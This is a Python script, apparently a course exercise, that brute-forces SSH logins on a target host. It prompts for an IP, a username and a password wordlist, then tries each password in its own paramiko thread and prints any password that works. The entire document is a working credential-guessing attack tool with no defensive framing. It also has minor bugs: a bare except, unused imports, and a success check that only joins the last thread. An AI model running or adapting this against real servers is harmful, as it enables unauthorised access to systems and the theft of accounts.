import paramiko, sys, os, socket, termcolor
import threading, time
flag = 0
def ssh_connect(host, username, password):
    global flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # invoke the ssh.connect function and pass 4 parameters
        # set flag to 1
        # print 'found password' and print the password
        #--------------
        ssh.connect(host, port=22, username=username, password=password)
        flag = 1
        print('found password, ' + str(password))
        #--------------
    except:
        # print 'incorrect login'
        pass
    ssh.close()
def main():
    # Prompt the user to enter target, username, and the password file
    #---------------
    host = input('Enter the IP of the target SSH server: ')
    username = input('Enter the username to be used during the attempted SSH connections: ')
    input_file = input('Enter the path of your password_file: ')
    #---------------
    # check if the file exists
    # if not, exit
    #--------------
    if os.path.exists(input_file) == False:
        print('Password file not found.')
        sys.exit(1)
    #--------------
    with open(input_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            t = threading.Thread(target=ssh_connect, args=(host, username, password))
            t.start()
            time.sleep(0.5)
    if flag == 1:
               t.join()
               exit()
if __name__ == '__main__':
    main()